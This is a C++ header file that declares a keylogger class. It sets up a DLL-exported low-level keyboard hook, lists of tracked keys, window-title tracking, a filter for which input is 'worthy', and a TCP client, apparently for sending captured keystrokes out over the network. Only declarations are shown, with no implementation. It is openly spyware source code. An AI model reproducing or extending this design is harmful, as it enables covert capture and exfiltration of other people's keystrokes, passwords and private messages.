#pragma once

#include "Filtering.h"
#include "Networking.h"
#include <string>
#include <vector>


class Keylogger {
private:
	static const std::vector<int> valueKeys;
	static const std::vector<int> specialKeys;
	static const std::vector<int> numpadKeys;
	static const std::vector<int> funcKeys;
	static const std::vector<std::vector<int>> trackedKeys;

	static const std::vector<std::wstring> specialKeysNames;

	static Filter* filter;
	static TcpClient* client;

	static BYTE states[256];

	static HWND hLastTrackedWindow;
	static bool titleUpdateRequest;
	static bool isWorthy;
	static std::wstring lastTrackedWindowTitle;

	static __declspec(dllexport) LRESULT CALLBACK KeyboardEventHandler(int nCode, WPARAM wParam, LPARAM lParam);

public:
	Keylogger(TcpClient* client, Filter* filter);
	~Keylogger();

	void LogKeys();

};